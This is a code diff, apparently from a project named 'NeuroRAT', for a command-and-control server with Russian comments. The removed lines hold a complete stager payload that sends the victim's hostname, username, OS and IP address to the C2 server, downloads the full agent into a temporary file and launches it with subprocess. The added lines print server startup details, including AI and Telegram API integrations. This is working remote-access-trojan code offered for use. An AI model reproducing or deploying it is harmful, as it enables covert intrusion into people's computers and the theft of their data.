-        # Идентификатор для логирования
-        request_id = str(uuid.uuid4())[:8]
-        logger.info(f"Запрос на загрузку стейджера от {request.remote_addr} (ID: {request_id})")
-        
-        # Создаем минимальный стейджер для загрузки полного агента
-        stager_code = f"""# NeuroRAT Stager
-import os
-import sys
-import time
-import socket
-import platform
-import uuid
-import base64
-import urllib.request
-
-# Используем настройки по умолчанию для сервера
-SERVER_HOST = "{request.host.split(':')[0]}"
-SERVER_PORT = {DEFAULT_PORT}
-
-# Генерируем уникальный идентификатор агента
-agent_id = str(uuid.uuid4())[:8]
-
-# Собираем информацию о системе
-def get_system_info():
-    info = {{
-        "os": platform.system(),
-        "hostname": socket.gethostname(),
-        "username": os.getenv("USER") or os.getenv("USERNAME"),
-        "processor": platform.processor(),
-        "python_version": platform.python_version()
-    }}
-    
-    # Получаем IP адрес
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        info["ip_address"] = s.getsockname()[0]
-        s.close()
-    except:
-        info["ip_address"] = "127.0.0.1"
-    
-    return info
-
-# Загружаем и запускаем основного агента
-try:
-    # Формируем URL для загрузки агента
-    url = f"http://{{SERVER_HOST}}:{{SERVER_PORT}}/api/download/agent"
-    
-    # Создаем POST-запрос с системной информацией
-    data = urllib.parse.urlencode({{"system_info": str(get_system_info())}}).encode()
-    
-    # Устанавливаем заголовок с идентификатором агента
-    headers = {{"Agent-ID": agent_id}}
-    
-    # Отправляем запрос
-    req = urllib.request.Request(url, data=data, headers=headers)
-    response = urllib.request.urlopen(req)
-    
-    # Получаем код агента
-    agent_code = response.read()
-    
-    # Сохраняем во временный файл
-    import tempfile
-    temp_dir = tempfile.gettempdir()
-    agent_path = os.path.join(temp_dir, f"agent_{{agent_id}}.py")
-    
-    with open(agent_path, "wb") as f:
-        f.write(agent_code)
-    
-    # Запускаем агента с параметрами
-    import subprocess
-    subprocess.Popen([
-        sys.executable, 
-        agent_path,
-        "--server", SERVER_HOST,
-        "--port", str(SERVER_PORT),
-        "--agent-id", agent_id
-    ])
-    
-except Exception as e:
-    # При ошибке пытаемся повторить через некоторое время
-    time.sleep(30)
-"""
-        
-        # Логируем событие
-        log_event("stager_download", f"Стейджер загружен с {request.remote_addr} (ID: {request_id})")
-        
-        return stager_code
-    except Exception as e:
-        logger.error(f"Ошибка при загрузке стейджера: {str(e)}")
-        return jsonify({"error": str(e)}), 500
+# Сохраняем шаблон builder.html
+with open("templates/builder.html", "w") as f:
+    f.write(builder_html)
 
 if __name__ == "__main__":
-    uvicorn.run(app, host="0.0.0.0", port=8080) 
+    print("NeuroRAT C2 Server starting...")
+    print(f"- Server URL: http://localhost:{DEFAULT_PORT}")
+    print(f"- Login page: http://localhost:{DEFAULT_PORT}/login")
+    print("Available API integrations:")
+    print(f"- OpenAI API: {'✅ Available' if openai_client.is_available() else '❌ Not configured'}")
+    print(f"- Gemini API: {'✅ Available' if gemini_client.is_available() else '❌ Not configured'}")
+    print(f"- Telegram API: {'✅ Available' if telegram_client.is_available() else '❌ Not configured'}")
+    print("\nPress Ctrl+C to stop the server")
+    uvicorn.run(app, host="0.0.0.0", port=DEFAULT_PORT) 
